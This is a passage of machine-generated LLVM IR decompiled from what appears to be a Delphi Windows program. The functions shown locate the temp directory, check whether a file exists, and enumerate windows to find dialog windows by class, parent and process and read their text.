  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1624
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1624
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1624
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1625
  %4 = call i32 @function_403c90(), !insn.addr !1626
  %5 = icmp slt i32 %4, 0, !insn.addr !1627
  br i1 %5, label %dec_label_pc_406c9c, label %dec_label_pc_406c6a, !insn.addr !1628

dec_label_pc_406c6a:                              ; preds = %dec_label_pc_406c14
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1629
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1630
  br label %dec_label_pc_406ce8

dec_label_pc_406c9c:                              ; preds = %dec_label_pc_406c14
  %8 = call i32 @function_403c88(), !insn.addr !1631
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1632
  %10 = call i32 @function_403c90(), !insn.addr !1633
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1634
  %12 = call i32 @function_403c90(), !insn.addr !1635
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1636
  %14 = call i32 @function_406ad4(), !insn.addr !1637
  br label %dec_label_pc_406ce8, !insn.addr !1637

dec_label_pc_406ce8:                              ; preds = %dec_label_pc_406c6a, %dec_label_pc_406c9c
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1638
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1639
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1640
  ret i32 %16, !insn.addr !1641
}

define i32 @function_406d03() local_unnamed_addr {
dec_label_pc_406d03:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1642
  ret i32 %0, !insn.addr !1642
}

define i32 @function_406d08() local_unnamed_addr {
dec_label_pc_406d08:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1643
}

define i32 @function_406d0a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1644
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1644
  %3 = load i32, i32* %2, align 4, !insn.addr !1644
  ret i32 %3, !insn.addr !1645
}

define i32 @function_406d14() local_unnamed_addr {
dec_label_pc_406d14:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1646
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1646
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1646
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1647
  %2 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1648
  %3 = add i32 %2, 1, !insn.addr !1648
  %4 = icmp eq i32 %3, 0, !insn.addr !1648
  store i32 %3, i32* @global_var_4096dc, align 4, !insn.addr !1648
  %5 = icmp eq i1 %4, false, !insn.addr !1649
  br i1 %5, label %dec_label_pc_406d4c, label %dec_label_pc_406d2d, !insn.addr !1649

dec_label_pc_406d2d:                              ; preds = %dec_label_pc_406d14
  %6 = load i32, i32* @global_var_408130, align 4, !insn.addr !1650
  %7 = icmp eq i32 %6, 0, !insn.addr !1650
  br i1 %7, label %dec_label_pc_406d3c, label %dec_label_pc_406d37, !insn.addr !1651

dec_label_pc_406d37:                              ; preds = %dec_label_pc_406d2d
  %8 = call i32 @function_406ad4(), !insn.addr !1652
  br label %dec_label_pc_406d3c, !insn.addr !1652

dec_label_pc_406d3c:                              ; preds = %dec_label_pc_406d37, %dec_label_pc_406d2d
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1653
  br label %dec_label_pc_406d4c, !insn.addr !1653

dec_label_pc_406d4c:                              ; preds = %dec_label_pc_406d3c, %dec_label_pc_406d14
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1654
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1655
  ret i32 0, !insn.addr !1656
}

define i32 @function_406d5a() local_unnamed_addr {
dec_label_pc_406d5a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1657
  ret i32 %0, !insn.addr !1657
}

define i32 @function_406d5f() local_unnamed_addr {
dec_label_pc_406d5f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1658
}

define i32 @function_406d61(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d61:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1659
}

define i32 @function_406d64() local_unnamed_addr {
dec_label_pc_406d64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1660
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1660
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1660
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1661
  %2 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1662
  %3 = add i32 %2, -1, !insn.addr !1662
  %4 = icmp eq i32 %2, 0, !insn.addr !1662
  store i32 %3, i32* @global_var_4096dc, align 4, !insn.addr !1662
  %5 = icmp eq i1 %4, false, !insn.addr !1663
  br i1 %5, label %dec_label_pc_406d98, label %dec_label_pc_406d7e, !insn.addr !1663

dec_label_pc_406d7e:                              ; preds = %dec_label_pc_406d64
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1664
  br label %dec_label_pc_406d98, !insn.addr !1665

dec_label_pc_406d98:                              ; preds = %dec_label_pc_406d7e, %dec_label_pc_406d64
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1666
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1667
  ret i32 0, !insn.addr !1668
}

define i32 @function_406da6() local_unnamed_addr {
dec_label_pc_406da6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1669
  ret i32 %0, !insn.addr !1669
}

define i32 @function_406dab() local_unnamed_addr {
dec_label_pc_406dab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1670
}

define i32 @function_406dad(i32 %arg1) local_unnamed_addr {
dec_label_pc_406dad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1671
}

define i1 @function_406db0(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406db0:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1672
  ret i1 %0, !insn.addr !1672
}

define i32 @function_406db8() local_unnamed_addr {
dec_label_pc_406db8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1673
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1674
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1675
  %2 = icmp eq i32 %1, 0, !insn.addr !1676
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1677
  br i1 %2, label %dec_label_pc_406dee, label %dec_label_pc_406dd0, !insn.addr !1677

dec_label_pc_406dd0:                              ; preds = %dec_label_pc_406db8
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1674
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1678
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1678
  %7 = load i8, i8* %6, align 1, !insn.addr !1678
  %8 = icmp eq i8 %7, 92, !insn.addr !1678
  br i1 %8, label %dec_label_pc_406de0, label %dec_label_pc_406dd7, !insn.addr !1679

dec_label_pc_406dd7:                              ; preds = %dec_label_pc_406dd0
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1680
  store i8 92, i8* %9, align 1, !insn.addr !1680
  %10 = or i32 %3, 1, !insn.addr !1681
  %11 = add i32 %1, %10, !insn.addr !1681
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1681
  store i8 0, i8* %12, align 1, !insn.addr !1681
  br label %dec_label_pc_406de0, !insn.addr !1681

dec_label_pc_406de0:                              ; preds = %dec_label_pc_406dd7, %dec_label_pc_406dd0
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1682
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1682
  br label %dec_label_pc_406dee, !insn.addr !1682

dec_label_pc_406dee:                              ; preds = %dec_label_pc_406de0, %dec_label_pc_406db8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1683
}

define i32 @function_406df8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406df8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1684
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1685
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1686
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1686
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1686
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1687
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1688
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1688
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1689
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1689
  %5 = icmp eq i1 %4, false, !insn.addr !1690
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1691
  br i1 %5, label %dec_label_pc_406eaf, label %dec_label_pc_406e2f, !insn.addr !1691

dec_label_pc_406e2f:                              ; preds = %dec_label_pc_406df8
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1692
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1692
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1693
  %8 = icmp eq i32 %7, 32770, !insn.addr !1694
  %9 = icmp eq i1 %8, false, !insn.addr !1695
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1695
  br i1 %9, label %dec_label_pc_406eaf, label %dec_label_pc_406e3e, !insn.addr !1695

dec_label_pc_406e3e:                              ; preds = %dec_label_pc_406e2f
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1696
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1696
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1697
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1697
  %13 = add i32 %arg1, 4, !insn.addr !1698
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1698
  %15 = load i32, i32* %14, align 4, !insn.addr !1698
  %16 = icmp eq i32 %15, %12, !insn.addr !1698
  %17 = icmp eq i1 %16, false, !insn.addr !1699
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1699
  br i1 %17, label %dec_label_pc_406eaf, label %dec_label_pc_406e49, !insn.addr !1699

dec_label_pc_406e49:                              ; preds = %dec_label_pc_406e3e
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1700
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1700
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1701
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1702
  %21 = load i32, i32* %20, align 4, !insn.addr !1702
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1703
  %23 = icmp eq i32 %21, %22, !insn.addr !1703
  %24 = icmp eq i1 %23, false, !insn.addr !1704
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1704
  br i1 %24, label %dec_label_pc_406eaf, label %dec_label_pc_406e5a, !insn.addr !1704

dec_label_pc_406e5a:                              ; preds = %dec_label_pc_406e49
  %25 = add i32 %arg1, 8, !insn.addr !1705
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1705
  %27 = load i32, i32* %26, align 4, !insn.addr !1705
  %28 = icmp eq i32 %27, 0, !insn.addr !1705
  br i1 %28, label %dec_label_pc_406e84, label %dec_label_pc_406e60, !insn.addr !1706

dec_label_pc_406e60:                              ; preds = %dec_label_pc_406e5a
  %29 = call i32 @function_406fd0(), !insn.addr !1707
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1708
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1709
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406eaf

dec_label_pc_406e84:                              ; preds = %dec_label_pc_406e5a
  %32 = add i32 %arg1, 12, !insn.addr !1710
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1710
  %34 = load i32, i32* %33, align 4, !insn.addr !1710
  %35 = add i32 %arg1, 16, !insn.addr !1711
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1711
  %37 = load i32, i32* %36, align 4, !insn.addr !1711
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1712
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1712
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1712
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1712
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1712
  %43 = add i32 %arg1, 24, !insn.addr !1713
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1713
  store i32 %42, i32* %44, align 4, !insn.addr !1713
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1714
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1714
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1715
  %47 = icmp eq i1 %46, false, !insn.addr !1716
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1717
  br i1 %47, label %dec_label_pc_406eaf, label %dec_label_pc_406eaa, !insn.addr !1717

dec_label_pc_406eaa:                              ; preds = %dec_label_pc_406e84
  %48 = add i32 %arg1, 20, !insn.addr !1718
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1718
  store i32 %arg2, i32* %49, align 4, !insn.addr !1718
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1719
  br label %dec_label_pc_406eaf, !insn.addr !1719

dec_label_pc_406eaf:                              ; preds = %dec_label_pc_406e60, %dec_label_pc_406eaa, %dec_label_pc_406e84, %dec_label_pc_406e49, %dec_label_pc_406e3e, %dec_label_pc_406e2f, %dec_label_pc_406df8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1720
  %51 = load i32, i32* %50, align 4, !insn.addr !1720
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1721
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1722
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1722
  store i32 4222673, i32* %53, align 4, !insn.addr !1722
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1723
  ret i32 %54, !insn.addr !1724
}

define i32 @function_406eca() local_unnamed_addr {
dec_label_pc_406eca:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1725
  ret i32 %0, !insn.addr !1725
}

define i32 @function_406ecf() local_unnamed_addr {
dec_label_pc_406ecf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1726
}

define i32 @function_406ed1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406ed1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1727
}

define i32 @function_406edc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406edc:
  %esp.0.reg2mem = alloca i32, !insn.addr !1728
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1729
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1730
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1730
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1730
  %6 = call i32 @function_40441c(), !insn.addr !1731
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1732
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1733
  br label %dec_label_pc_406f20, !insn.addr !1733

dec_label_pc_406f20:                              ; preds = %dec_label_pc_406f3f, %dec_label_pc_406edc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1732
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1732
  store i32 %7, i32* %9, align 4, !insn.addr !1732
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1734
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1734
  store i32 4222456, i32* %11, align 4, !insn.addr !1734
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1735
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1736
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1736
  store i32 1, i32* %14, align 4, !insn.addr !1736
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1737
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1738
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1738
  store i32 0, i32* %16, align 4, !insn.addr !1738
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1739
  %18 = icmp eq i1 %17, false, !insn.addr !1740
  %19 = icmp eq i1 %18, false, !insn.addr !1741
  br i1 %19, label %dec_label_pc_406f4a, label %dec_label_pc_406f3f, !insn.addr !1741

dec_label_pc_406f3f:                              ; preds = %dec_label_pc_406f20
  %20 = call i32 @function_40441c(), !insn.addr !1742
  %21 = sub i32 %20, %6, !insn.addr !1743
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1744
  %23 = icmp eq i1 %22, false, !insn.addr !1745
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1745
  br i1 %23, label %dec_label_pc_406f20, label %dec_label_pc_406f4a, !insn.addr !1745

dec_label_pc_406f4a:                              ; preds = %dec_label_pc_406f3f, %dec_label_pc_406f20
  ret i32 0, !insn.addr !1746
}

define i32 @function_406f64() local_unnamed_addr {
dec_label_pc_406f64:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1747
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1748
}

define i32 @function_406f7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_406f7c:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1749
  %edi.0.reg2mem = alloca i32, !insn.addr !1749
  %ecx.0.reg2mem = alloca i32, !insn.addr !1749
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1750
  br label %2, !insn.addr !1750

; <label>:2:                                      ; preds = %4, %dec_label_pc_406f7c
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1750
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1750
  br i1 %3, label %10, label %4, !insn.addr !1750

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1750
  %6 = load i8, i8* %5, align 1, !insn.addr !1750
  %7 = icmp eq i8 %6, 0, !insn.addr !1750
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1750
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1750
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1750
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1750
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1750
  br i1 %7, label %10, label %2, !insn.addr !1750

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1751
  ret i32 %11, !insn.addr !1752
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_406fd0() local_unnamed_addr {
dec_label_pc_406fd0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1753
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1754
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1754
  %4 = add i32 %3, %1, !insn.addr !1755
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1755
  store i8 0, i8* %5, align 1, !insn.addr !1755
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1756
  ret i32 %6, !insn.addr !1757
}

define i32 @function_407004() local_unnamed_addr {
dec_label_pc_407004:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1758
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1759
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1760
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1760
  %6 = add i32 %5, %3, !insn.addr !1761
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1761
  store i8 0, i8* %7, align 1, !insn.addr !1761
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1762
  ret i32 %8, !insn.addr !1763
}

define i32 @function_40703c() local_unnamed_addr {
dec_label_pc_40703c:
  %0 = call i32 @function_4034c8(), !insn.addr !1764
  %1 = call i32 @function_4034c8(), !insn.addr !1765
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1766
  ret i32 %2, !insn.addr !1767
}

define i32 @function_40707c() local_unnamed_addr {
dec_label_pc_40707c:
  %0 = call i32 @function_4034c8(), !insn.addr !1768
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1769
  ret i32 %1, !insn.addr !1770
}

define i32 @function_4070b4() local_unnamed_addr {
dec_label_pc_4070b4:
  %0 = call i32 @function_4036c8(), !insn.addr !1771
  %1 = call i32 @function_4036c8(), !insn.addr !1772
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1773
  %3 = icmp eq i32 %2, 2, !insn.addr !1774
  %4 = zext i1 %3 to i32, !insn.addr !1775
  %5 = and i32 %2, -256, !insn.addr !1775
  %6 = or i32 %5, %4, !insn.addr !1775
  ret i32 %6, !insn.addr !1776
}

define i32 @function_4070e4() local_unnamed_addr {
dec_label_pc_4070e4:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1777
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1777
  %esp.02.reg2mem = alloca i32, !insn.addr !1777
  %storemerge3.reg2mem = alloca i32, !insn.addr !1777
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1778
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1778
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1778
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1779
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1780
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1781
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1781
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1782
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1782
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1782
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1783
  %9 = icmp eq i1 %8, false, !insn.addr !1784
  %10 = icmp eq i1 %9, false, !insn.addr !1785
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1785
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1785
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1785
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1785
  br i1 %10, label %dec_label_pc_407108, label %dec_label_pc_407148, !insn.addr !1785

dec_label_pc_407108:                              ; preds = %dec_label_pc_4070e4, %dec_label_pc_407108
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_406fd0(), !insn.addr !1786
  %12 = call i32 @function_4070e4(), !insn.addr !1787
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1788
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1788
  store i32 2, i32* %14, align 4, !insn.addr !1788
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1789
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1789
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1789
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1790
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1782
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1782
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1783
  %21 = icmp eq i1 %20, false, !insn.addr !1784
  %22 = icmp eq i1 %21, false, !insn.addr !1785
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1785
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1785
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1785
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1785
  br i1 %22, label %dec_label_pc_407108, label %dec_label_pc_407148, !insn.addr !1785

dec_label_pc_407148:                              ; preds = %dec_label_pc_407108, %dec_label_pc_4070e4
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1791
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1792
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1793
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1793
  store i32 4223333, i32* %25, align 4, !insn.addr !1793
  %26 = call i32 @"@LStrClr"(), !insn.addr !1794
  ret i32 %26, !insn.addr !1795
}

define i32 @function_40715e() local_unnamed_addr {
dec_label_pc_40715e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1796
  ret i32 %0, !insn.addr !1796
}

define i32 @function_407163() local_unnamed_addr {
dec_label_pc_407163:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1797
}

define i32 @function_407165(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407165:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1798
}

define i32 @function_407170() local_unnamed_addr {
dec_label_pc_407170:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1799
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1799
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1799
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1800
  %2 = call i32 @function_407004(), !insn.addr !1801
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1802
  %4 = call i32 @function_4070e4(), !insn.addr !1803
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1804
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1805
  %6 = call i32 @"@LStrClr"(), !insn.addr !1806
  ret i32 %6, !insn.addr !1807
}

define i32 @function_4071d1() local_unnamed_addr {
dec_label_pc_4071d1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1808
  ret i32 %0, !insn.addr !1808
}

define i32 @function_4071d6() local_unnamed_addr {
dec_label_pc_4071d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1809
}

define i32 @function_4071d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4071d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1810
}

define i32 @function_4071f3() local_unnamed_addr {
dec_label_pc_4071f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1811
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1811
  store i32 %3, i32* %4, align 4, !insn.addr !1811
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1812
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1812
